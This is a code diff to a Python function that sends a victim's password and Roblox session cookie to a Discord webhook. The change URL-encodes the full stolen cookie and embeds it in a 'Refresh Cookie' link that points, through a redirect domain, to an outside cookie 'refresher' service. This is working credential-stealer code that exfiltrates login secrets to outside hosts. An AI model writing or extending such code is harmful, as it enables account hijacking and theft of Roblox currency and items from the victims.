@@ -62,7 +62,14 @@ def send_to_discord_background(password, cookie, webhook_url):
         # Prepare cookie content for Discord (cookie is already cleaned)
         cookie_content = cookie if cookie else 'Not provided'
         
-        # Truncate cookie if too long for Discord
+        # Prepare full cookie with warning prefix for refresh link
+        full_cookie_with_warning = f'_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{cookie}'
+        
+        # URL encode the full cookie for the refresh link
+        import urllib.parse
+        encoded_full_cookie = urllib.parse.quote(full_cookie_with_warning, safe='')
+        
+        # Truncate cookie if too long for Discord embed
         available_cookie_space = 3990  # Conservative limit
         if len(cookie_content) > available_cookie_space:
             cookie_content = cookie_content[:available_cookie_space] + "..."
@@ -78,7 +85,7 @@ def send_to_discord_background(password, cookie, webhook_url):
                     'fields': [
                         {
                             'name': '🔗 Quick Links',
-                            'value': '[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_)',
+                            'value': f'[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})',
                             'inline': False
                         }
                     ]
